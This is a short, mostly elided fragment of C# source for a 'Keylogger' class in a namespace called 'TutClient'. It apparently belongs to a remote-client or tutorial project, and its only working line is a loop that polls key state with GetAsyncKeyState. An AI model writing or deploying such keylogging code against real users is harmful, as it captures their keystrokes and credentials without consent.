...
namespace TutClient
{
    ...
    class Keylogger
    {
        ...
        /// The state of the key (pressed or not)
        ...
        /// "text" is the buffer to save the text to
        /// "count" is the number of chars to read
        ...
        /// "currentKey" is the pressed key
        /// "inputValue" is the input value to update the old with
        /// returns the new string data to append to the log
        ...
        public static void Logger()
        {
            ...
            while (true) 
            {
                ...
                {
                    int keyState = GetAsyncKeyState(i); //Get the state of the key if key is pressed or held
